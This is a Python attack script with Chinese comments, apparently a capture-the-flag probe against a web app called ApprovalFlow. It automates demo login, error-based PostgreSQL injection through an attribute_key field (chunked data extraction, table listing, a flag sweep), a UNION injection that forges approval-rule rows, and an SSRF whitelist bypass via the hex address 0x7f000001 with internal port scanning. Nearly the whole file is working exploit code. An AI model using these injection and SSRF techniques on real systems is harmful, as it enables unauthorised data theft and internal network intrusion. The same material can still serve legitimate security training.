#!/usr/bin/env python3
"""12065 ApprovalFlow 可复现探针（未拿到 flag，但覆盖全部已确认原语）。

用法:
    python3 scripts/12065-solve.py http://<address>/

覆盖:
  1. 演示账号登录（会话 + CSRF 缓存 + 限速/退避）
  2. attribute_key 报错型 Postgres 注入：注出 flow_settings / 表结构 / 全库 flag 扫描
  3. UNION 伪造 approval_rules 行（规则引擎可被 union 注入）
  4. /integration/dispatch SSRF 白名单绕过（0x7f000001）+ 内网端口拓扑
  5. 出站回调协议抓取（需要外部可见 URL，见 notes）
  6. 自检断言：以上每一项都用"回包文本"验证，不靠猜测

作者备注（重要）:
  - attribute_key 校验 max:120 字符；500 页 <pre> 回显约 165 字符后截断
     => 单次注入最多带出 ~55 字符，长数据必须用 substr 分块。
  - 注入原语: x'is not null or(cast((<SELECT>)as int)=0)--
  - 本脚本不写库（堆叠语句被 prepared statement 拒绝）、不读文件（af_app 非超级用户）。
"""
import re
import sys
import json
import time

import requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000").rstrip("/")
S = requests.Session()
S.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/124.0 Safari/537.36"})
PACING = 1.2
_last = [0.0]
_token = {"v": None}

HEAD = "x'is not null or("
TAIL = ")--"
BUDGET = 120 - len(HEAD) - len(TAIL)          # 98


def _pace():
    dt = time.time() - _last[0]
    if dt < PACING:
        time.sleep(PACING - dt)
    _last[0] = time.time()


def req(method, path, **kw):
    kw.setdefault("timeout", 20)
    last = None
    for delay in (0, 4, 8, 16):
        if delay:
            time.sleep(delay)
        _pace()
        try:
            return S.request(method, BASE + path if path.startswith("/") else path, **kw)
        except Exception as e:      # 容器限流：连接重置/超时
            last = type(e).__name__
    raise RuntimeError(f"{method} {path} failed: {last}")


def csrf(path="/documents/create", force=False):
    if _token["v"] and not force:
        return _token["v"]
    r = req("GET", path)
    m = re.search(r'name="_token" value="([^"]+)"', r.text)
    _token["v"] = m.group(1) if m else None
    return _token["v"]


def demo_login():
    t = csrf("/login", force=True)
    r = req("POST", "/demo-login", data={"_token": t}, allow_redirects=False)
    assert r.status_code == 302 and "/dashboard" in r.headers.get("Location", ""), "demo-login 失败"
    csrf("/documents/create", force=True)
    d = req("GET", "/dashboard")
    who = re.search(r'<span>(.*?)</span>', d.text)
    print(f"[+] demo-login ok: {who.group(1) if who else '?'}")
    return d


# ---------------------------------------------------------------- SQLi 原语
def sqli_raw(expr):
    """返回 500 页 <pre> 文本（HTML 实体已解码），无报错返回 None。"""
    key = HEAD + expr + TAIL
    assert len(key) <= 120, f"key too long: {len(key)}"
    r = req("POST", "/documents", data={"_token": csrf(), "type": "差旅报销", "amount": "1200",
                                        "reason": "probe", "attribute_key": key,
                                        "attribute_value": "1", "callback_url": ""})
    if r.status_code != 500:
        return None
    m = re.search(r'<pre class="box">(.*?)</pre>', r.text, re.S)
    b = m.group(1) if m else r.text
    return (b.replace("&quot;", '"').replace("&#039;", "'")
             .replace("&lt;", "<").replace("&gt;", ">").replace("&amp;", "&"))


def sqli(sql, label=""):
    if len("(%s)::int=0" % sql) > BUDGET:          # 120 字符 key 预算不够
        print(f"    [!] SQL 超出 key 预算，跳过: {sql[:50]}")
        return None
    """把 sql 的标量结果塞进报错里带回；sql 必须返回 text 且非纯数字。

    用 `(sql)::int=0` 比 `cast((sql)as int)=0` 省 6 个字符（120 字符 key 预算紧张）。
    """
    expr = "(%s)::int=0" % sql
    body = sqli_raw(expr)
    if body is None:
        return None
    m = re.search(r'invalid input syntax for type integer: "(.*)', body, re.S)
    if not m:
        return "RAW:" + body[:200]
    v = m.group(1).split(" (Connection:")[0]
    if not v.endswith('"'):          # <pre> 被截断（约 165 字符）=> 本块不可信
        return None
    return v[:-1]


def sqli_chunked(sql, chunk=45, maxlen=2000):
    """分块注出字符串（贴合 120 字符 key 与 165 字符回显上限）。"""
    out, off = "", 1
    while off <= maxlen:
        # 自适应：保证 cast((sub)as int)=0 不超过 98 字符预算
        while chunk > 8 and len("select substr((%s),%d,%d)" % (sql, off, chunk)) + 11 > BUDGET:
            chunk = max(8, chunk - 5)
        if len("select substr((%s),%d,%d)" % (sql, off, chunk)) + 11 > BUDGET:
            print(f"    [!] 查询过长，无法分块: {sql}")
            break
        sub = "select substr((%s),%d,%d)" % (sql, off, chunk)
        v = sqli(sub)
        if v is None:
            break
        out += v
        if len(v) < chunk:
            break
        off += chunk
    return out


# ---------------------------------------------------------------- 侦察
def dump_settings():
    """逐行注出 flow_settings（键/值都短，避免 120 字符预算问题）。"""
    out = {}
    for n in range(0, 10):
        k = sqli("select key from flow_settings order by key limit 1 offset %d" % n)
        if k is None:
            break
        v = sqli_chunked("select value from flow_settings where key='%s'" % k, chunk=30)
        out[k] = v
        print(f"    {k} = {v}")
    print(f"[+] flow_settings: {out}")
    return out


def list_tables():
    t = sqli_chunked("select string_agg(relname,',')from pg_class", chunk=45, maxlen=1200)
    print(f"[+] relations: {t[:400]}...")
    return t


def flag_sweep():
    tables = ["users", "documents", "document_events", "approval_rules",
              "flow_settings", "callback_logs", "notification_templates", "migrations"]
    for t in tables:
        n = sqli("select 'n'||count(*)from %s where %s::text like '%%DAS%%'" % (t, t))
        print(f"    DAS in {t:22} -> {n}")


def union_rule():
    """UNION 伪造审批规则行（证据：页面出现 规则 X / 当前节点 L0）。"""
    key = "x'is not null union select 999,'X','{}'::jsonb,0,null,1--"
    r = req("POST", "/documents", data={"_token": csrf(), "type": "差旅报销", "amount": "1200",
                                        "reason": "union", "attribute_key": key,
                                        "attribute_value": "1", "callback_url": ""})
    loc = r.headers.get("Location", "")
    assert "/documents/" in loc, f"union 注入未生效: {r.status_code}"
    d = req("GET", loc.replace(BASE, ""))
    m = re.search(r'id="document-data">(.*?)</script>', d.text, re.S)
    print(f"[+] UNION forged rule -> {m.group(1) if m else '?'}")


# ---------------------------------------------------------------- SSRF
def dispatch(url, method="GET", headers="", body=""):
    r = req("POST", "/integration/dispatch", data={"_token": csrf(), "url": url, "method": method,
                                                   "headers": headers, "body": body})
    if r.status_code == 302:
        f = req("GET", "/documents/create")
        fl = re.findall(r'class="flash[^"]*"[^>]*>(.*?)</div>', f.text, re.S)
        return {"blocked": [x.strip() for x in fl]}
    m = re.search(r'id="integration-result">(.*?)</script>', r.text, re.S)
    return json.loads(m.group(1)) if m else {"raw": r.text[:200]}


def ssrf_check():
    d = dispatch("http://127.0.0.1:8081/")
    print(f"[+] 127.0.0.1:8081 -> {d.get('blocked')} (应被拦)")
    d = dispatch("http://0x7f000001:8081/")
    t = re.search(r'<title>(.*?)</title>', d.get("response", "") or "", re.S)
    print(f"[+] 0x7f000001:8081 -> code={d.get('code')} title={t.group(1).strip() if t else '-'}")
    assert d.get("code") == 200, "白名单绕过失效"
    for p in (80, 5432, 8080, 3306, 6379):
        d = dispatch(f"http://0x7f000001:{p}/")
        resp = d.get("response", "") or ""
        state = "open" if "Failed to connect" not in resp and "curl error 7" not in resp.lower() else "closed"
        print(f"    127.0.0.1:{p:<5} {state} ({d.get('code')})")


def main():
    demo_login()
    dump_settings()
    list_tables()
    flag_sweep()
    union_rule()
    ssrf_check()
    print("\n[!] 已知未解出的最后一跳：审批回调 ingest 路由（黑盒 ~1000 条路径全 404）。")
    print("[!] 详见 notes/12065-ApprovalFlow.md §4。")


if __name__ == "__main__":
    main()
